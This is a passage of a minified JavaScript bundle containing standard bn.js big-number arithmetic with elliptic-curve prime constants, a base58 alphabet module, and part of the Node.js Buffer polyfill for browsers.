>0;)(a.isOdd()||c.isOdd())&&(a.iadd(h),c.isub(l)),a.iushrn(1),c.iushrn(1);e.cmp(r)>=0?(e.isub(r),i.isub(a),s.isub(c)):(r.isub(e),a.isub(i),c.isub(s))}return{a,b:c,gcd:r.iushln(u)}},o.prototype._invmp=function(t){n(0===t.negative),n(!t.isZero());var e=this,r=t.clone();e=0!==e.negative?e.umod(t):e.clone();for(var i,s=new o(1),a=new o(0),c=r.clone();e.cmpn(1)>0&&r.cmpn(1)>0;){for(var u=0,h=1;!(e.words[0]&h)&&u<26;++u,h<<=1);if(u>0)for(e.iushrn(u);u-- >0;)s.isOdd()&&s.iadd(c),s.iushrn(1);for(var l=0,f=1;!(r.words[0]&f)&&l<26;++l,f<<=1);if(l>0)for(r.iushrn(l);l-- >0;)a.isOdd()&&a.iadd(c),a.iushrn(1);e.cmp(r)>=0?(e.isub(r),s.isub(a)):(r.isub(e),a.isub(s))}return(i=0===e.cmpn(1)?s:a).cmpn(0)<0&&i.iadd(t),i},o.prototype.gcd=function(t){if(this.isZero())return t.abs();if(t.isZero())return this.abs();var e=this.clone(),r=t.clone();e.negative=0,r.negative=0;for(var n=0;e.isEven()&&r.isEven();n++)e.iushrn(1),r.iushrn(1);for(;;){for(;e.isEven();)e.iushrn(1);for(;r.isEven();)r.iushrn(1);var i=e.cmp(r);if(i<0){var o=e;e=r,r=o}else if(0===i||0===r.cmpn(1))break;e.isub(r)}return r.iushln(n)},o.prototype.invm=function(t){return this.egcd(t).a.umod(t)},o.prototype.isEven=function(){return!(1&this.words[0])},o.prototype.isOdd=function(){return!(1&~this.words[0])},o.prototype.andln=function(t){return this.words[0]&t},o.prototype.bincn=function(t){n("number"==typeof t);var e=t%26,r=(t-e)/26,i=1<<e;if(this.length<=r)return this._expand(r+1),this.words[r]|=i,this;for(var o=i,s=r;0!==o&&s<this.length;s++){var a=0|this.words[s];o=(a+=o)>>>26,a&=67108863,this.words[s]=a}return 0!==o&&(this.words[s]=o,this.length++),this},o.prototype.isZero=function(){return 1===this.length&&0===this.words[0]},o.prototype.cmpn=function(t){var e,r=t<0;if(0!==this.negative&&!r)return-1;if(0===this.negative&&r)return 1;if(this._strip(),this.length>1)e=1;else{r&&(t=-t),n(t<=67108863,"Number is too big");var i=0|this.words[0];e=i===t?0:i<t?-1:1}return 0!==this.negative?0|-e:e},o.prototype.cmp=function(t){if(0!==this.negative&&0===t.negative)return-1;if(0===this.negative&&0!==t.negative)return 1;var e=this.ucmp(t);return 0!==this.negative?0|-e:e},o.prototype.ucmp=function(t){if(this.length>t.length)return 1;if(this.length<t.length)return-1;for(var e=0,r=this.length-1;r>=0;r--){var n=0|this.words[r],i=0|t.words[r];if(n!==i){n<i?e=-1:n>i&&(e=1);break}}return e},o.prototype.gtn=function(t){return 1===this.cmpn(t)},o.prototype.gt=function(t){return 1===this.cmp(t)},o.prototype.gten=function(t){return this.cmpn(t)>=0},o.prototype.gte=function(t){return this.cmp(t)>=0},o.prototype.ltn=function(t){return-1===this.cmpn(t)},o.prototype.lt=function(t){return-1===this.cmp(t)},o.prototype.lten=function(t){return this.cmpn(t)<=0},o.prototype.lte=function(t){return this.cmp(t)<=0},o.prototype.eqn=function(t){return 0===this.cmpn(t)},o.prototype.eq=function(t){return 0===this.cmp(t)},o.red=function(t){return new B(t)},o.prototype.toRed=function(t){return n(!this.red,"Already a number in reduction context"),n(0===this.negative,"red works only with positives"),t.convertTo(this)._forceRed(t)},o.prototype.fromRed=function(){return n(this.red,"fromRed works only with numbers in reduction context"),this.red.convertFrom(this)},o.prototype._forceRed=function(t){return this.red=t,this},o.prototype.forceRed=function(t){return n(!this.red,"Already a number in reduction context"),this._forceRed(t)},o.prototype.redAdd=function(t){return n(this.red,"redAdd works only with red numbers"),this.red.add(this,t)},o.prototype.redIAdd=function(t){return n(this.red,"redIAdd works only with red numbers"),this.red.iadd(this,t)},o.prototype.redSub=function(t){return n(this.red,"redSub works only with red numbers"),this.red.sub(this,t)},o.prototype.redISub=function(t){return n(this.red,"redISub works only with red numbers"),this.red.isub(this,t)},o.prototype.redShl=function(t){return n(this.red,"redShl works only with red numbers"),this.red.shl(this,t)},o.prototype.redMul=function(t){return n(this.red,"redMul works only with red numbers"),this.red._verify2(this,t),this.red.mul(this,t)},o.prototype.redIMul=function(t){return n(this.red,"redMul works only with red numbers"),this.red._verify2(this,t),this.red.imul(this,t)},o.prototype.redSqr=function(){return n(this.red,"redSqr works only with red numbers"),this.red._verify1(this),this.red.sqr(this)},o.prototype.redISqr=function(){return n(this.red,"redISqr works only with red numbers"),this.red._verify1(this),this.red.isqr(this)},o.prototype.redSqrt=function(){return n(this.red,"redSqrt works only with red numbers"),this.red._verify1(this),this.red.sqrt(this)},o.prototype.redInvm=function(){return n(this.red,"redInvm works only with red numbers"),this.red._verify1(this),this.red.invm(this)},o.prototype.redNeg=function(){return n(this.red,"redNeg works only with red numbers"),this.red._verify1(this),this.red.neg(this)},o.prototype.redPow=function(t){return n(this.red&&!t.red,"redPow(normalNum)"),this.red._verify1(this),this.red.pow(this,t)};var v={k256:null,p224:null,p192:null,p25519:null};function k(t,e){this.name=t,this.p=new o(e,16),this.n=this.p.bitLength(),this.k=new o(1).iushln(this.n).isub(this.p),this.tmp=this._tmp()}function S(){k.call(this,"k256","ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")}function A(){k.call(this,"p224","ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")}function E(){k.call(this,"p192","ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")}function _(){k.call(this,"25519","7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")}function B(t){if("string"==typeof t){var e=o._prime(t);this.m=e.p,this.prime=e}else n(t.gtn(1),"modulus must be greater than 1"),this.m=t,this.prime=null}function I(t){B.call(this,t),this.shift=this.m.bitLength(),this.shift%26!=0&&(this.shift+=26-this.shift%26),this.r=new o(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}k.prototype._tmp=function(){var t=new o(null);return t.words=new Array(Math.ceil(this.n/13)),t},k.prototype.ireduce=function(t){var e,r=t;do{this.split(r,this.tmp),e=(r=(r=this.imulK(r)).iadd(this.tmp)).bitLength()}while(e>this.n);var n=e<this.n?-1:r.ucmp(this.p);return 0===n?(r.words[0]=0,r.length=1):n>0?r.isub(this.p):void 0!==r.strip?r.strip():r._strip(),r},k.prototype.split=function(t,e){t.iushrn(this.n,0,e)},k.prototype.imulK=function(t){return t.imul(this.k)},i(S,k),S.prototype.split=function(t,e){for(var r=4194303,n=Math.min(t.length,9),i=0;i<n;i++)e.words[i]=t.words[i];if(e.length=n,t.length<=9)return t.words[0]=0,void(t.length=1);var o=t.words[9];for(e.words[e.length++]=o&r,i=10;i<t.length;i++){var s=0|t.words[i];t.words[i-10]=(s&r)<<4|o>>>22,o=s}o>>>=22,t.words[i-10]=o,0===o&&t.length>10?t.length-=10:t.length-=9},S.prototype.imulK=function(t){t.words[t.length]=0,t.words[t.length+1]=0,t.length+=2;for(var e=0,r=0;r<t.length;r++){var n=0|t.words[r];e+=977*n,t.words[r]=67108863&e,e=64*n+(e/67108864|0)}return 0===t.words[t.length-1]&&(t.length--,0===t.words[t.length-1]&&t.length--),t},i(A,k),i(E,k),i(_,k),_.prototype.imulK=function(t){for(var e=0,r=0;r<t.length;r++){var n=19*(0|t.words[r])+e,i=67108863&n;n>>>=26,t.words[r]=i,e=n}return 0!==e&&(t.words[t.length++]=e),t},o._prime=function(t){if(v[t])return v[t];var e;if("k256"===t)e=new S;else if("p224"===t)e=new A;else if("p192"===t)e=new E;else{if("p25519"!==t)throw new Error("Unknown prime "+t);e=new _}return v[t]=e,e},B.prototype._verify1=function(t){n(0===t.negative,"red works only with positives"),n(t.red,"red works only with red numbers")},B.prototype._verify2=function(t,e){n(!(t.negative|e.negative),"red works only with positives"),n(t.red&&t.red===e.red,"red works only with red numbers")},B.prototype.imod=function(t){return this.prime?this.prime.ireduce(t)._forceRed(this):(h(t,t.umod(this.m)._forceRed(this)),t)},B.prototype.neg=function(t){return t.isZero()?t.clone():this.m.sub(t)._forceRed(this)},B.prototype.add=function(t,e){this._verify2(t,e);var r=t.add(e);return r.cmp(this.m)>=0&&r.isub(this.m),r._forceRed(this)},B.prototype.iadd=function(t,e){this._verify2(t,e);var r=t.iadd(e);return r.cmp(this.m)>=0&&r.isub(this.m),r},B.prototype.sub=function(t,e){this._verify2(t,e);var r=t.sub(e);return r.cmpn(0)<0&&r.iadd(this.m),r._forceRed(this)},B.prototype.isub=function(t,e){this._verify2(t,e);var r=t.isub(e);return r.cmpn(0)<0&&r.iadd(this.m),r},B.prototype.shl=function(t,e){return this._verify1(t),this.imod(t.ushln(e))},B.prototype.imul=function(t,e){return this._verify2(t,e),this.imod(t.imul(e))},B.prototype.mul=function(t,e){return this._verify2(t,e),this.imod(t.mul(e))},B.prototype.isqr=function(t){return this.imul(t,t.clone())},B.prototype.sqr=function(t){return this.mul(t,t)},B.prototype.sqrt=function(t){if(t.isZero())return t.clone();var e=this.m.andln(3);if(n(e%2==1),3===e){var r=this.m.add(new o(1)).iushrn(2);return this.pow(t,r)}for(var i=this.m.subn(1),s=0;!i.isZero()&&0===i.andln(1);)s++,i.iushrn(1);n(!i.isZero());var a=new o(1).toRed(this),c=a.redNeg(),u=this.m.subn(1).iushrn(1),h=this.m.bitLength();for(h=new o(2*h*h).toRed(this);0!==this.pow(h,u).cmp(c);)h.redIAdd(c);for(var l=this.pow(h,i),f=this.pow(t,i.addn(1).iushrn(1)),d=this.pow(t,i),p=s;0!==d.cmp(a);){for(var g=d,m=0;0!==g.cmp(a);m++)g=g.redSqr();n(m<p);var y=this.pow(l,new o(1).iushln(p-m-1));f=f.redMul(y),l=y.redSqr(),d=d.redMul(l),p=m}return f},B.prototype.invm=function(t){var e=t._invmp(this.m);return 0!==e.negative?(e.negative=0,this.imod(e).redNeg()):this.imod(e)},B.prototype.pow=function(t,e){if(e.isZero())return new o(1).toRed(this);if(0===e.cmpn(1))return t.clone();var r=new Array(16);r[0]=new o(1).toRed(this),r[1]=t;for(var n=2;n<r.length;n++)r[n]=this.mul(r[n-1],t);var i=r[0],s=0,a=0,c=e.bitLength()%26;for(0===c&&(c=26),n=e.length-1;n>=0;n--){for(var u=e.words[n],h=c-1;h>=0;h--){var l=u>>h&1;i!==r[0]&&(i=this.sqr(i)),0!==l||0!==s?(s<<=1,s|=l,(4==++a||0===n&&0===h)&&(i=this.mul(i,r[s]),a=0,s=0)):a=0}c=26}return i},B.prototype.convertTo=function(t){var e=t.umod(this.m);return e===t?e.clone():e},B.prototype.convertFrom=function(t){var e=t.clone();return e.red=null,e},o.mont=function(t){return new I(t)},i(I,B),I.prototype.convertTo=function(t){return this.imod(t.ushln(this.shift))},I.prototype.convertFrom=function(t){var e=this.imod(t.mul(this.rinv));return e.red=null,e},I.prototype.imul=function(t,e){if(t.isZero()||e.isZero())return t.words[0]=0,t.length=1,t;var r=t.imul(e),n=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),i=r.isub(n).iushrn(this.shift),o=i;return i.cmp(this.m)>=0?o=i.isub(this.m):i.cmpn(0)<0&&(o=i.iadd(this.m)),o._forceRed(this)},I.prototype.mul=function(t,e){if(t.isZero()||e.isZero())return new o(0)._forceRed(this);var r=t.mul(e),n=r.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),i=r.isub(n).iushrn(this.shift),s=i;return i.cmp(this.m)>=0?s=i.isub(this.m):i.cmpn(0)<0&&(s=i.iadd(this.m)),s._forceRed(this)},I.prototype.invm=function(t){return this.imod(t._invmp(this.m).mul(this.r2))._forceRed(this)}}(t=r.nmd(t),this)},763:(t,e,r)=>{var n=r(364);t.exports=n("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz")},287:(t,e,r)=>{"use strict";const n=r(526),i=r(251),o="function"==typeof Symbol&&"function"==typeof Symbol.for?Symbol.for("nodejs.util.inspect.custom"):null;e.Buffer=c,e.SlowBuffer=function(t){return+t!=t&&(t=0),c.alloc(+t)},e.INSPECT_MAX_BYTES=50;const s=2147483647;function a(t){if(t>s)throw new RangeError('The value "'+t+'" is invalid for option "size"');const e=new Uint8Array(t);return Object.setPrototypeOf(e,c.prototype),e}function c(t,e,r){if("number"==typeof t){if("string"==typeof e)throw new TypeError('The "string" argument must be of type string. Received type number');return l(t)}return u(t,e,r)}function u(t,e,r){if("string"==typeof t)return function(t,e){if("string"==typeof e&&""!==e||(e="utf8"),!c.isEncoding(e))throw new TypeError("Unknown encoding: "+e);const r=0|g(t,e);let n=a(r);const i=n.write(t,e);return i!==r&&(n=n.slice(0,i)),n}(t,e);if(ArrayBuffer.isView(t))return function(t){if(J(t,Uint8Array)){const e=new Uint8Array(t);return d(e.buffer,e.byteOffset,e.byteLength)}return f(t)}(t);if(null==t)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t);if(J(t,ArrayBuffer)||t&&J(t.buffer,ArrayBuffer))return d(t,e,r);if("undefined"!=typeof SharedArrayBuffer&&(J(t,SharedArrayBuffer)||t&&J(t.buffer,SharedArrayBuffer)))return d(t,e,r);if("number"==typeof t)throw new TypeError('The "value" argument must not be of type number. Received type number');const n=t.valueOf&&t.valueOf();if(null!=n&&n!==t)return c.from(n,e,r);const i=function(t){if(c.isBuffer(t)){const e=0|p(t.length),r=a(e);return 0===r.length||t.copy(r,0,0,e),r}return void 0!==t.length?"number"!=typeof t.length||Z(t.length)?a(0):f(t):"Buffer"===t.type&&Array.isArray(t.data)?f(t.data):void 0}(t);if(i)return i;if("undefined"!=typeof Symbol&&null!=Symbol.toPrimitive&&"function"==typeof t[Symbol.toPrimitive])return c.from(t[Symbol.toPrimitive]("string"),e,r);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof t)}function h(t){if("number"!=typeof t)throw new TypeError('"size" argument must be of type number');if(t<0)throw new RangeError('The value "'+t+'" is invalid for option "size"')}function l(t){return h(t),a(t<0?0:0|p(t))}function f(t){const e=t.length<0?0:0|p(t.length),r=a(e);for(let n=0;n<e;n+=1)r[n]=255&t[n];return r}function d(t,e,r){if(e<0||t.byteLength<e)throw new RangeError('"offset" is outside of buffer bounds');if(t.byteLength<e+(r||0))throw new RangeError('"length" is outside of buffer bounds');let n;return n=void 0===e&&void 0===r?new Uint8Array(t):void 0===r?new Uint8Array(t,e):new Uint8Array(t,e,r),Object.setPrototypeOf(n,c.prototype),n}function p(t){if(t>=s)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+s.toString(16)+" bytes");return 0|t}function g(t,e){if(c.isBuffer(t))return t.length;if(ArrayBuffer.isView(t)||J(t,ArrayBuffer))return t.byteLength;if("string"!=typeof t)throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof t);const r=t.length,n=arguments.length>2&&!0===arguments[2];if(!n&&0===r)return 0;let i=!1;for(;;)switch(e){case"ascii":case"latin1":case"binary":return r;case"utf8":case"utf-8":return $(t).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*r;case"hex":return r>>>1;case"base64":return V(t).length;default:if(i)return n?-1:$(t).length;e=(""+e).toLowerCase(),i=!0}}function m(t,e,r){let n=!1;if((void 0===e||e<0)&&(e=0),e>this.length)return"";if((void 0===r||r>this.length)&&(r=this.length),r<=0)return"";if((r>>>=0)<=(e>>>=0))return"";for(t||(t="utf8");;)switch(t){case"hex":return O(this,e,r);case"utf8":case"utf-8":return B(this,e,r);case"ascii":return x(this,e,r);case"latin1":case"binary":return M(this,e,r);case"base64":return _(this,e,r);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return T(this,e,r);default:if(n)throw new TypeError("Unknown encoding: "+t);t=(t+"").toLowerCase(),n=!0}}function y(t,e,r){const n=t[e];t[e]=t[r],t[r]=n}function w(t,e,r,n,i){if(0===t.length)return-1;if("string"==typeof r?(n=r,r=0):r>2147483647?r=2147483647:r<-2147483648&&(r=-2147483648),Z(r=+r)&&(r=i?0:t.length-1),r<0&&(r=t.length+r),r>=t.length){if(i)return-1;r=t.length-1}else if(r<0){if(!i)return-1;r=0}if("string"==typeof e&&(e=c.from(e,n)),c.isBuffer(e))return 0===e.length?-1:b(t,e,r,n,i);if("number"==typeof e)return e&=255,"function"==typeof Uint8Array.prototype.indexOf?i?Uint8Array.prototype.indexOf.call(t,e,r):Uint8Array.prototype.lastIndexOf.call(t,e,r):b(t,[e],r,n,i);throw new TypeError("val must be string, number or Buffer")}function b(t,e,r,n,i){let o,s=1,a=t.length,c=e.length;if(void 0!==n&&("ucs2"===(n=String(n).toLowerCase())||"ucs-2"===n||"utf16le"===n||"utf-16le"===n)){if(t.length<2||e.length<2)return-1;s=2,a/=2,c/=2,r/=2}function u(t,e){return 1===s?t[e]:t.readUInt16BE(e*s)}if(i){let n=-1;for(o=r;o<a;o++)if(u(t,o)===u(e,-1===n?0:o-n)){if(-1===n&&(n=o),o-n+1===c)return n*s}else-1!==n&&(o-=o-n),n=-1}else for(r+c>a&&(r=a-c),o=r;o>=0;o--){let r=!0;for(let n=0;n<c;n++)if(u(t,o+n)!==u(e,n)){r=!1;break}if(r)return o}return-1}function v(t,e,r,n){r=Number(r)||0;const i=t.length-r;n?(n=Number(n))>i&&(n=i):n=i;const o=e.length;let s;for(n>o/2&&(n=o/2),s=0;s<n;++s){const n=parseInt(e.substr(2*s,2),16);if(Z(n))return s;t[r+s]=n}return s}function k(t,e,r,n){return G($(e,t.length-r),t,r,n)}function S(t,e,r,n){return G(function(t){const e=[];for(let r=0;r<t.length;++r)e.push(255&t.charCodeAt(r));return e}(e),t,r,n)}function A(t,e,r,n){return G(V(e),t,r,n)}function E(t,e,r,n){return G(function(t,e){let r,n,i;const o=[];for(let s=0;s<t.length&&!((e-=2)<0);++s)r=t.charCodeAt(s),n=r>>8,i=r%256,o.push(i),o.push(n);return o}(e,t.length-r),t,r,n)}function _(t,e,r){return 0===e&&r===t.length?n.fromByteArray(t):n.fromByteArray(t.slice(e,r))}function B(t,e,r){r=Math.min(t.length,r);const n=[];let i=e;for(;i<r;){const e=t[i];let o=null,s=e>239?4:e>223?3:e>191?2:1;if(i+s<=r){let r,n,a,c;switch(s){case 1:e<128&&(o=e);break;case 2:r=t[i+1],128==(192&r)&&(c=(31&e)<<6|63&r,c>127&&(o=c));break;case 3:r=t[i+1],n=t[i+2],128==(192&r)&&128==(192&n)&&(c=(15&e)<<12|(63&r)<<6|63&n,c>2047&&(c<55296||c>57343)&&(o=c));break;case 4:r=t[i+1],n=t[i+2],a=t[i+3],128==(192&r)&&128==(192&n)&&128==(192&a)&&(c=(15&e)<<18|(63&r)<<12|(63&n)<<6|63&a,c>65535&&c<1114112&&(o=c))}}null===o?(o=65533,s=1):o>65535&&(o-=65536,n.push(o>>>10&1023|55296),o=56320|1023&o),n.push(o),i+=s}return function(t){const e=t.length;if(e<=I)return String.fromCharCode.apply(String,t);let r="",n=0;for(;n<e;)r+=String.fromCharCode.apply(String,t.slice(n,n+=I));return r}(n)}e.kMaxLength=s,c.TYPED_ARRAY_SUPPORT=function(){try{const t=new Uint8Array(1),e={foo:function(){return 42}};return Object.setPrototypeOf(e,Uint8Array.prototype),Object.setPrototypeOf(t,e),42===t.foo()}catch(t){return!1}}(),c.TYPED_ARRAY_SUPPORT||"undefined"==typeof console||"function"!=typeof console.error||console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),Object.defineProperty(c.prototype,"parent",{enumerable:!0,get:function(){if(c.isBuffer(this))return this.buffer}}),Object.defineProperty(c.prototype,"offset",{enumerable:!0,get:function(){if(c.isBuffer(this))return this.byteOffset}}),c.poolSize=8192,c.from=function(t,e,r){return u(t,e,r)},Object.setPrototypeOf(c.prototype,Uint8Array.prototype),Object.setPrototypeOf(c,Uint8Array),c.alloc=function(t,e,r){return function(t,e,r){return h(t),t<=0?a(t):void 0!==e?"string"==typeof r?a(t).fill(e,r):a(t).fill(e):a(t)}(t,e,r)},c.allocUnsafe=function(t){return l(t)},c.allocUnsafeSlow=function(t){return l(t)},c.isBuffer=function(t){return null!=t&&!0===t._isBuffer&&t!==c.prototype},c.compare=function(t,e){if(J(t,Uint8Array)&&(t=c.from(t,t.offset,t.byteLength)),J(e,Uint8Array)&&(e=c.from(e,e.offset,e.byteLength)),!c.isBuffer(t)||!c.isBuffer(e))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(t===e)return 0;let r=t.length,n=e.length;for(let i=0,o=Math.min(r,n);i<o;++i)if(t[i]!==e[i]){r=t[i],n=e[i];break}return r<n?-1:n<r?1:0},c.isEncoding=function(t){switch(String(t).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},c.concat=function(t,e){if(!Array.isArray(t))throw new TypeError('"list" argument must be an Array of Buffers');if(0===t.length)return c.alloc(0);let r;if(void 0===e)for(e=0,r=0;r<t.length;++r)e+=t[r].length;const n=c.allocUnsafe(e);let i=0;for(r=0;r<t.length;++r){let e=t[r];if(J(e,Uint8Array))i+e.length>n.length?(c.isBuffer(e)||(e=c.from(e)),e.copy(n,i)):Uint8Array.prototype.set.call(n,e,i);else{if(!c.isBuffer(e))throw new TypeError('"list" argument must be an Array of Buffers');e.copy(n,i)}i+=e.length}return n},c.byteLength=g,c.prototype._isBuffer=!0,c.prototype.swap16=function(){const t=this.length;if(t%2!=0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let e=0;e<t;e+=2)y(this,e,e+1);return this},c.prototype.swap32=function(){const t=this.length;if(t%4!=0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let e=0;e<t;e+=4)y(this,e,e+3),y(this,e+1,e+2);return this},c.prototype.swap64=function(){const t=this.length;if(t%8!=0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let e=0;e<t;e+=8)y(this,e,e+7),y(this,e+1,e+6),y(this,e+2,e+5),y(this,e+3,e+4);return this},c.prototype.toString=function(){const t=this.length;return 0===t?"":0===arguments.length?B(this,0,t):m.apply(this,arguments)},c.prototype.toLocaleString=c.prototype.toString,c.prototype.equals=function(t){if(!c.isBuffer(t))throw new TypeError("Argument must be a Buffer");return this===t||0===c.compare(this,t)},c.prototype.inspect=function(){let t="";const r=e.INSPECT_MAX_BYTES;return t=this.toString("hex",0,r).replace(/(.{2})/g,"$1 ").trim(),this.length>r&&(t+=" ... "),"<Buffer "+t+">"},o&&(c.prototype[o]=c.prototype.inspect),c.prototype.compare=function(t,e,r,n,i){if(J(t,Uint8Array)&&(t=c.from(t,t.offset,t.byteLength)),!c.isBuffer(t))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof t);if(void 0===e&&(e=0),void 0===r&&(r=t?t.length:0),void 0===n&&(n=0),void 0===i&&(i=this.length),e<0||r>t.length||n<0||i>this.length)throw new RangeError("out of range index");if(n>=i&&e>=r)return 0;if(n>=i)return-1;if(e>=r)return 1;if(this===t)return 0;let o=(i>>>=0)-(n>>>=0),s=(r>>>=0)-(e>>>=0);const a=Math.min(o,s),u=this.slice(n,i),h=t.slice(e,r);for(let t=0;t<a;++t)if(u[t]!==h[t]){o=u[t],s=h[t];break}return o<s?-1:s<o?1:0},c.prototype.includes=function(t,e,r){return-1!==this.indexOf(t,e,r)},c.prototype.indexOf=function(t,e,r){return w(this,t,e,r,!0)},c.prototype.lastIndexOf=function(t,e,r){return w(this,t,e,r,!1)},c.prototype.write=function(t,e,r,n){if(void 0===e)n="utf8",r=this.length,e=0;else if(void 0===r&&"string"==typeof e)n=e,r=this.length,e=0;else{if(!isFinite(e))throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");e>>>=0,isFinite(r)?(r>>>=0,void 0===n&&(n="utf8")):(n=r,r=void 0)}const i=this.length-e;if((void 0===r||r>i)&&(r=i),t.length>0&&(r<0||e<0)||e>this.length)throw new RangeError("Attempt to write outside buffer bounds");n||(n="utf8");let o=!1;for(;;)switch(n){case"hex":return v(this,t,e,r);case"utf8":case"utf-8":return k(this,t,e,r);case"ascii":case"latin1":case"binary":return S(this,t,e,r);case"base64":return A(this,t,e,r);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return E(this,t,e,r);default:if(o)throw new TypeError("Unknown encoding: "+n);n=(""+n).toLowerCase(),o=!0}},c.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};const I=4096;function x(t,e,r){let n="";r=Math.min(t.length,r);for(let i=e;i<r;++i)n+=String.fromCharCode(127&t[i]);return n}function M(t,e,r){let n="";r=Math.min(t.length,r);for(let i=e;i<r;++i)n+=String.fromCharCode(t[i]);return n}function O(t,e,r){const n=t.length;(!e||e<0)&&(e=0),(!r||r<0||r>n)&&(r=n);let i="";for(let n=e;n<r;++n)i+=Y[t[n]];return i}function T(t,e,r){const n=t.slice(e,r);let i="";for(let t=0;t<n.length-1;t+=2)i+=String.fromCharCode(n[t]+256*n[t+1]);return i}function R(t,e,r){if(t%1!=0||t<0)throw new RangeError("offset is not uint");if(t+e>r)throw new RangeError("Trying to access beyond buffer length")}function P(t,e,r,n,i,o){if(!c.isBuffer(t))throw new TypeError('"buffer" argument must be a Buffer instance');if(e>i||e<o)throw new RangeError('"value" argument is out of bounds');if(r+n>t.length)throw new RangeError("Index out of range")}function C(t,e,r,n,i){q(e,n,i,t,r,7);let o=Number(e&BigInt(4294967295));t[r++]=o,o>>=8,t[r++]=o,o>>=8,t[r++]=o,o>>=8,t[r++]=o;let s=Number(e>>BigInt(32)&BigInt(4294967295));return t[r++]=s,s>>=8,t[r++]=s,s>>=8,t[r++]=s,s>>=8,t[r++]=s,r}function L(t,e,r,n,i){q(e,n,i,t,r,7);let o=Number(e&BigInt(4294967295));t[r+7]=o,o>>=8,t[r+6]=o,o>>=8,t[r+5]=o,o>>=8,t[r+4]=o;let s=Number(e>>BigInt(32)&BigInt(4294967295));return t[r+3]=s,s>>=8,t[r+2]=s,s>>=8,t[r+1]=s,s>>=8,t[r]=s,r+8}function N(t,e,r,n,i,o){if(r+n>t.length)throw new RangeError("Index out of range");if(r<0)throw new RangeError("Index out of range")}function U(t,e,r,n,o){return e=+e,r>>>=0,o||N(t,0,r,4),i.write(t,e,r,n,23,4),r+4}function z(t,e,r,n,o){return e=+e,r>>>=0,o||N(t,0,r,8),i.write(t,e,r,n,52,8),r+8}c.prototype.slice=function(t,e){const r=this.length;(t=~~t)<0?(t+=r)<0&&(t=0):t>r&&(t=r),(e=void 0===e?r:~~e)<0?(e+=r)<0&&(e=0):e>r&&(e=r),e<t&&(e=t);const n=this.subarray(t,e);return Object.setPrototypeOf(n,c.prototype),n},c.prototype.readUintLE=c.prototype.readUIntLE=function(t,e,r){t>>>=0,e>>>=0,r||R(t,e,this.length);let n=this[t],i=1,o=0;for(;++o<e&&(i*=256);)n+=this[t+o]*i;return n},c.prototype.readUintBE=c.prototype.readUIntBE=function(t,e,r){t>>>=0,e>>>=0,r||R(t,e,this.length);let n=this[t+--e],i=1;for(;e>0&&(i*=256);)n+=this[t+--e]*i;return n},c.prototype.readUint8=c.prototype.readUInt8=function(t,e){return t>>>=0,e||R(t,1,this.length),this[t]},c.prototype.readUint16LE=c.prototype.readUInt16LE=function(t,e){return t>>>=0,e||R(t,2,this.length),this[t]|this[t+1]<<8},c.prototype.readUint16BE=c.prototype.readUInt16BE=function(t,e){return t>>>=0,e||R(t,2,this.length),this[t]<<8|this[t+1]},c.prototype.readUint32LE=c.prototype.readUInt32LE=function(t,e){return t>>>=0,e||R(t,4,this.length),(this[t]|this[t+1]<<8|this[t+2]<<16)+16777216*this[t+3]},c.prototype.readUint32BE=c.prototype.readUInt32BE=function(t,e){return t>>>=0,e||R(t,4,this.length),16777216*this[t]+(this[t+1]<<16|this[t+2]<<8|this[t+3])},c.prototype.readBigUInt64LE=X((function(t){F(t>>>=0,"offset");const e=this[t],r=this[t+7];void 0!==e&&void 0!==r||H(t,this.length-8);const n=e+256*this[++t]+65536*this[++t]+this[++t]*2**24,i=this[++t]+256*this[++t]+65536*this[++t]+r*2**24;return BigInt(n)+(BigInt(i)<<BigInt(32))})),c.prototype.readBigUInt64BE=X((function(t){F(t>>>=0,"offset");const e=this[t],r=this[t+7];void 0!==e&&void 0!==r||H(t,this.length-8);const n=e*2**24+65536*this[++t]+256*this[++t]+this[++t],i=this[++t]*2**24+65536*this[++t]+256*this[++t]+r;return(BigInt(n)<<BigInt(32))+BigInt(i)})),c.prototype.readIntLE=function(t,e,r){t>>>=0,e>>>=0,r||R(t,e,this.length);let n=this[t],i=1,o=0;for(;++o<e&&(i*=256);)n+=this[t+o]*i;return i*=128,n>=i&&(n-=Math.pow(2,8*e)),n},c.prototype.readIntBE=function(t,e,r){t>>>=0,e>>>=0,r||R(t,e,this.length);let n=e,i=1,o=this[t+--n];for(;n>0&&(i*=256);)o+=this[t+--n]*i;return i*=128,o>=i&&(o-=Math.pow(2,8*e)),o},c.prototype.readInt8=function(t,e){return t>>>=0,e||R(t,1,this.length),128&this[t]?-1*(255-this[t]+1):this[t]},c.prototype.readInt16LE=function(t,e){t>>>=0,e||R(t,2,this.length);const r=this[t]|this[t+1]<<8;return 